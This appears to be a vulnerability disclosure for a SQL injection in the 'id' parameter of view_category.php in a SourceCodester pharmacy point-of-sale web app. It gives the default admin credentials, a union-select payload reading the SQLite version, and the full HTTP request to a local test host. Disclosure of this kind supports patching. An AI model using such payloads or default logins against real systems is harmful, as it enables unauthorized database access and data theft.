# Pharmacy Point of Sale System v1.0 by sourcecodester has SQL injection 1

BUG_Author: Zhang Qi

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/14957/pharmacy-point-sale-system-using-php-and-sqlite-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /pharmacy/view_category.php

Vulnerability location: /pharmacy/view_category.php?id=, id

[+] Payload: /pharmacy/view_category.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ // Leak place ---> id

```sql
GET /pharmacy/view_category.php?id=1%27%20union%20select%201,sqlite_version(),3,4--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=1lo81k0mv3p5cfonn5hopvoht6
Connection: close
```

<img width="923" height="481" alt="image" src="https://github.com/user-attachments/assets/6dafd8cc-ed46-4fba-960e-4526bb4f0495" />
